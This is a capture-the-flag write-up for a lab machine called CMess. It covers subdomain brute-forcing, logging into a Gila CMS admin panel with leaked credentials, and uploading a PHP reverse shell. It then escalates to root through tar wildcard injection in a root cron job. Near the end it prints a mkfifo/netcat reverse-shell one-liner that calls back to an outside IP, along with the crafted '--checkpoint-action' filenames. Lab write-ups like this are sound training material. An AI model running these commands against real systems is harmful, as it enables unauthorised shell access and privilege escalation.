## CMess
### OS = LINUX
### DIFFICULTY = MEDIUM

#### nmap scan
![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/8bd8e60b-d4a1-44c0-b81b-258334a1a04a)

we have 2 open ports

let's start our enumeration from port 80

going over to the web page shows that it is running GILA cms

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/cf983be5-438e-4287-88dc-0ca136cafe3f)

so, let's add the domain "cmess.thm" to our /etc/hosts file

Then bruteforcing subdomains using ffuf gives this

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/f313a0bf-71c3-4343-83d5-c49bc8248bbc)

which shows that there is subdomain "dev.cmess.thm"

Also add the subdomain to the /etc/hosts file too

let's go over to the web we have some creds which you can see below
![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/061713fc-1194-40d4-8d11-72ff242bccaa)

so, let's try the credential on the admin login page 

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/ca8084ad-7b89-4c18-a839-6f3837e1fa08)

wow it works and we can see the GILA CMS version

so, moving on to the content page on the dashboard for us to upload a reverse shell script in the file manager

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/41f5c718-cab6-4e97-9f97-7916bf6123d2)
so we're able to upload a php reverse shell

And set ur ncat listener then visit the assets directory to load the uploaded shell

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e84cd810-3054-4a73-981c-fca53b24de0e)

it spawned us a shell on the target system

we have our sweet reverse shell. so, stabilize it
![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/c3f9e157-3537-45e9-a1d4-35b28bc19cc8)
 so, we can see our privilege is limited
 let's try escalating privilege
 ## Privilege escalation

   Uploading linpeas on the box 
  
   we found a password back up file at the /opt dir
  
   it contains the password for user "andre"
  
   ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e547fd57-3b7e-468b-bcbe-4d71204d83ca)

 so sshing into the server using the username and password

 we're able to read the user flag now

 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/c95df228-8832-4e61-8115-9639ab8bdc81)

 Okay, so from this we know that there's a backup service running on the server, we can also see this from the linpeas report, and we also found the backed up file in the /tmp folder earlier when we were looking for user priv-esc. We can in fact see the exact command that is being run when the backup happens .
```  */2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz * ```
 There's a way to exploit tar if it uses wildcards, there is more info on it in this article ![link](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) .

The name of the attack is Wildcard injection, and it's a way to make tar run an executable for us. Since the backup service is running as root, if we make this executable a reverse shell, then we got ourselves a root shell. 
set your netcat listener.

```1. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >/tmp/f" > shell.sh```

```2. echo ""> "--checkpoint-action=exec=sh shell.sh"```

```3. echo ""> --checkpoint=1```
   
And we are root lol ;)

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/a012c48a-9f56-4d95-ad31-b57caef3835b)

Thanks hope you had fun!

For any enquiries shoot me a dm on twitter @ ![link](https://twitter.co/0x_venus)










